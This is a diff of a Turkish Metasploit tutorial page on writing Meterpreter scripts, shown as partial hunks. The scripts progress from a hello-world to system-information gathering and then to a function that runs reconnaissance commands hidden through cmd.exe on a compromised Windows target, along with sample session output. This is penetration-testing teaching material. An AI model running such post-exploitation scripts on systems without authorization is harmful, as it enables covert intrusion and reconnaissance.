@@ -1,29 +1,30 @@
 ---
 draft: false
-
-title:  'MSF Meterpreter Script Düzenleme'
-date: '2017-06-14T13:49:00+03:00'
+title: MSF Meterpreter Script Düzenleme
+linkTitle: Meterpreter Script Düzenleme
+translationKey: msf-meterpreter-script-editing
+weight: 350
+date: 2017-06-14T13:49:00+03:00
 author: İbrahim Korucuoğlu ([@siberoloji](https://github.com/siberoloji))
-
-description:  "Meterpreter Scriptin nasıl bir yapı olduğunu önceki iki yazımızda kısaca gördük. Şimdi, kodların ne sonuç döndürdüğünü parça parça görelim. Bunun için “Hello World” ruby kodu yazalım ve\_helloworld.rb\_olarak\_/usr/share/metasploit-framework/scripts/meterpreter\_klasörüne kayıt edelim." 
- 
-url:  /tr/msf-meterpreter-script-duzenleme/
- 
+description: Meterpreter Scriptin kodların ne sonuç döndürdüğünü parça parça göreceğiz.
+url: /tr/msf-meterpreter-script-duzenleme/
 featured_image: /images/metasploit.jpg
 categories:
-    - 'Metasploit Framework'
+   - Metasploit Framework
 tags:
-    - cybersecurity
-    - 'metasploit framework'
+   - cybersecurity
+   - metasploit framework
 ---
 ## Script Yazma
 
 Meterpreter Scriptin nasıl bir yapı olduğunu önceki iki yazımızda kısaca gördük. Şimdi, kodların ne sonuç döndürdüğünü parça parça görelim. Bunun için “Hello World” ruby kodu yazalım ve `helloworld.rb` olarak `/usr/share/metasploit-framework/scripts/meterpreter` klasörüne kayıt edelim.
+
 ```bash
 root@kali:~# echo “print_status(“Hello World”)” > /usr/share/metasploit-framework/scripts/meterpreter/helloworld.rb
 ```
 
 Oluşturduğumuz script kodunu meterpreter oturum açık iken çalıştıralım.
+
 ```bash
 meterpreter > run helloworld
 > Hello World
@@ -31,12 +32,14 @@ meterpreter >
 ```
 
 Basit bir Ruby kodunu, meterpreter içinde çalıştırmış olduk. Şimdi ise bir kaç API çağrısını `helloworld.rb` dosyamızın içine ekleyelim. Aşağıdaki satırları, metin editör kullanarak ekleyebilirsiniz.
+
 ```bash
 print_error(“this is an error!”)
 print_line(“this is a line”)
 ```
 
 Yukarıdaki satırlar, standart veri girişi ve hata mesajları için kullanıma bir örnek oluşturmaktadır. Oluşturduğumuz kodları çalıştıralım.
+
 ```bash
 meterpreter > run helloworld
 > Hello World
@@ -48,6 +51,7 @@ meterpreter >
 ## helloworld.rb
 
 Script kod dosyamız en son olarak aşağıdaki gibi olmalıdır.
+
 ```bash
 print_status("Hello World")
 print_error("this is an error!")
@@ -55,6 +59,7 @@ print_line("This is a line")
 ```
 
 Şimdi kodumuza bir fonksiyon ekleyelim. Bu fonksiyonda, bir kaç temel bilgi elde edeceğiz ve hata kontrol özelliği ekleyeceğiz. Oluşturacağımız mimarinin yapısı aşağıdaki gibi olacaktır.
+
 ```bash
  def geninfo(session)
     begin
@@ -66,6 +71,7 @@ print_line("This is a line")
 ```
 
 Bu yapıyı oluşturmak için dosyayı aşağıdaki şekilde düzenlemeniz yeterlidir. Bu düzenlemeleri yaptıktan sonra `helloworld.rb` dosyamızın içeriği aşağıdaki gibi olacaktır.
+
 ```bash
  def getinfo(session)
     begin
@@ -86,6 +92,7 @@ Bu kodların ne işlem yaptığını adım adım açıklayalım. Öncelikle, de�
 ## helloworld2.rb
 
 İlk oluşturduğumuz dosyaya ufak bir ilave yaparak `helloworld2.rb` dosyası üretelim. `helloworld2.rb` dosyası, az önce oluşturduğumuz dosyanın sonuna getinfo(client) satırının eklenmiş halidir. Bu satırı ekleyip dosyayı `helloworld2.rb` olarak kayıt edelim. Dosyanın son hali aşağıdaki gibi olmalıdır.
+
 ```bash
  def getinfo(session)
     begin
@@ -104,6 +111,7 @@ Bu kodların ne işlem yaptığını adım adım açıklayalım. Öncelikle, de�
 ```
 
 Şimdi hazırladığımız `helloworld2.rb` dosyamızı Meterpreter oturumunda çalıştıralım.
+
 ```bash
  meterpreter > run helloworld2
  > Getting system information ...
@@ -117,12 +125,13 @@ Gördüğünüz gibi `helloworld2.rb` scripti ile bir takım sistem bigilerini e
 ## helloworld3.rb
 
 Yukarıda oluşturduğumuz iki örnek kod dosyasından sonra şimdi başka bir örnek scripte bakalım. Bu script dosyasını metin editorü ile oluşturabilirsiniz. İçeriği aşağıdaki gibi olmalıdır.
+
 ```bash
 def list_exec(session,cmdlst)
     print_status("Running Command List ...")
     r=''
     session.response_timeout=120
-    cmdlst.each **do** |cmd|
+    cmdlst.each do |cmd|
        begin
           print_status "running command #{cmd}"
           r = session.sys.process.execute("cmd.exe /c #{cmd}", nil, {'Hidden' => true, 'Channelized' => true**})**
@@ -142,6 +151,7 @@ def list_exec(session,cmdlst)
 Yukarıdaki kodların ne işlemler yaptığına kısaca bakalım. Öncelikle, `list_exec` isimli bir fonksiyon tanımlanmıştır. Bu fonksiyon, `session` ve `cmdlist` isimli iki değişken almaktadır. `cmdlist` değişkeninin array yöntemiyle bir dizi komutlar olduğu, kodlardan anlaşılmaktadır. Bu komutlar, sırayla değişkenden alınacak `cmd.exe` üzerinden hedef sistemde çalıştırılacaktır. Sistemin donma ve tepkisiz kalma durumunu önlemek için `session.response_timeout=120` 120 saniye bekleme süresi tanımlanmıştır. Önceki script kodunda olduğu gibi hata kontrol satırı da bulunmaktadır.
 
 `cmdlist` dizi değişkeni aslında aşağıda gösterilen komutları sırayla çalıştırmaktadır.
+
 ```bash
  commands = [ “set”,
     “ipconfig  /all”,
@@ -151,6 +161,7 @@ Yukarıdaki kodların ne işlemler yaptığına kısaca bakalım. Öncelikle, `l
 Komutların sonunda da oluşturduğumuz fonksiyonu çalıştırma satırı `list_exec(client,commands)` bulunmaktadır.
 
 Şimdi oluşturduğumuz yeni helloworld3.rb script kodunu Meterpreter oturumu içinde çalıştıralım.
+
 ```bash
  meterpreter > run helloworld3
  > Running Command List ...
